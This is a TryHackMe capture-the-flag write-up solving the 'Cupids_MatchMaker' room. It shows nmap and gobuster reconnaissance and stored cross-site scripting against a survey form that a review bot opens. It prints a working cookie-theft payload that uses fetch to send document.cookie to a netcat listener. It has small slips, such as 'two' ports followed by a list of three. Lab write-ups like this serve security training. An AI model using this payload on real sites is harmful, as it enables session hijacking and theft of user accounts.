# TryHackMe - Cupids_MatchMaker Writeup

## Overview

This is a detailed walkthrough of how I get the **Cupids_MatchMaker** room flag. The room involved `stored XSS`.

---

## Recon :

I started the engagement with an `nmap` scan:

```bash
nmap -sC -sV -p- -v -oN /home/kali/Desktop/THM_LAB/rooms/cupids_matcher/scan.txt <target-ip>
```

The scan revealed two open ports:

- **22** (SSH)
- **631** (IPP)
- **5000** (HTTP)

---

## Enumeration: Web Application Discovery

Accessing port 5000 initially led Homepage. Nothing currently looks interesting, anything we input on about you will just be sent to the developers. so i started to check hidden directories  

```bash
gobuster dir -u http://<target-ip>/static/  -w /usr/share/seclists/Discovery/Web-Content/big.txt
```
i found there was a login page and nothing more. then i tried to find out vulnerability in the `/survey` there i found a clue which was indicator to stored xss.
ie.
In CTF terms, “a human reviews your submission” means a bot automatically opens submitted content in a browser. If any survey field is rendered as raw HTML without sanitisation, injected JavaScript will execute in the bot’s browser context — and anything it has access to (cookies, local storage, the page DOM) can be exfiltrated to an attacker-controlled listener.

---

## Exploitation :

i started a netcat listener to catch the callback.

```bash
nc -lvnp 4444
```
Submit the survey with the following XSS payload in any input field on `Find Your Perfect Match` field:

```bash
<script>fetch('http://<target-ip>:4444/?c='+document.cookie)</script>
```
Submitting the survey with the above XSS payload in the describe_yourself field. i waited for a while until the bot reviews my subbmission.

after a while the bot reviewer opens the submission, the script executes in its browser context, and the cookie is sent back to the listener.

here, i got flag.

---

🖼️ **Find all screenshots here:** [`screenshots/cupids_matchmaker/`](../screenshots/cupids_matchmaker/)


*Thanks for reading!*
